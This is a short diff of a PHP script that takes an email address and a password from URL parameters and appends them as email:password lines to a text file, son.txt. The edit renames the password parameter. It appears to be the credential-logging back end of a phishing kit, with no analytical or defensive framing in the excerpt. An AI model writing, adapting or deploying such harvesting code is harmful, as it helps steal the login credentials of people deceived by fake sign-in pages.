@@ -1,7 +1,7 @@
 <html>
 <?
 $caixa1 = $_GET["email"].":";
-$caixa2 = $_GET["pass"]. "\n";
+$caixa2 = $_GET["pw"]. "\n";
 
 $file = fopen("son.txt", "a");
 $escrever1 = fwrite($file, $caixa1);
